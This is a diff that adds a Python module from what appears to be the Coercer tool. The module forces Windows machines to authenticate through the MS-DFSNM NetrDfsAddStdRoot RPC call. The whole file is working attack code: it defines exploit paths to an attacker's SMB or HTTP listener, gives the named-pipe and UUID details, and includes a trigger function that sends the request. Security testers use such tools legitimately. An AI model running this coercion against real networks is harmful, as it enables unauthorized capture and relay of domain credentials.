@@ -1,0 +1,94 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# File name          : NetrDfsAddStdRoot.py
+# Author             : Podalirius (@podalirius_)
+# Date created       : 14 Sep 2022
+
+from impacket.dcerpc.v5.dtypes import DWORD, WSTR
+from impacket.dcerpc.v5.ndr import NDRCALL
+
+from coercer.core.utils import gen_random_name
+from coercer.models.MSPROTOCOLRPCCALL import MSPROTOCOLRPCCALL
+
+
+class _NetrDfsAddStdRoot(NDRCALL):
+    """
+    Structure to make the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol
+    """
+
+    opnum = 12
+    structure = (
+        ("ServerName", WSTR),  # Type: WCHAR *
+        ("RootShare", WSTR),  # Type: WCHAR *
+        ("Comment", WSTR),  # Type: WCHAR *
+        ("ApiFlags", DWORD),  # Type: DWORD
+    )
+
+
+class _NetrDfsAddStdRootResponse(NDRCALL):
+    """
+    Structure to parse the response of the RPC call to NetrDfsAddStdRoot() in MS-DFSNM Protocol
+    """
+
+    structure = ()
+
+
+class NetrDfsAddStdRoot(MSPROTOCOLRPCCALL):
+    """
+    Coercing a machine to authenticate using function NetrDfsAddStdRoot (opnum 12) of [MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979)
+
+    Method found by:
+     - [@filip_dragovic](https://twitter.com/filip_dragovic)
+    """
+
+    exploit_paths = [
+        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\file.txt\x00"),
+        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\\\x00"),
+        ("smb", "\\\\{{listener}}{{smb_listen_port}}\\{{rnd(8)}}\x00"),
+        (
+            "http",
+            "\\\\{{listener}}{{http_listen_port}}/{{rnd(3)}}\\share\\file.txt\x00",
+        ),
+    ]
+
+    access = {
+        "ncan_np": [
+            {
+                "namedpipe": r"\PIPE\netdfs",
+                "uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673",
+                "version": "3.0",
+            }
+        ],
+        "ncacn_ip_tcp": [
+            {"uuid": "4fc742e0-4a10-11cf-8273-00aa004ae673", "version": "3.0"}
+        ],
+    }
+
+    protocol = {
+        "longname": "[MS-DFSNM]: Distributed File System (DFS): Namespace Management Protocol",
+        "shortname": "MS-DFSNM",
+    }
+
+    function = {
+        "name": "NetrDfsAddStdRoot",
+        "opnum": 12,
+        "vulnerable_arguments": ["ServerName"],
+    }
+
+    def trigger(self, dcerpc_session, target):
+        if dcerpc_session is not None:
+            try:
+                request = _NetrDfsAddStdRoot()
+                request["ServerName"] = self.path
+                request["RootShare"] = gen_random_name() + "\x00"
+                request["Comment"] = gen_random_name() + "\x00"
+                request["ApiFlags"] = 0
+                dcerpc_session.request(request)
+                return ""
+            except Exception as err:
+                return err
+        else:
+            from coercer.core.Reporter import reporter
+
+            reporter.print_error("Error: dce is None, you must call connect() first.")
+            return None
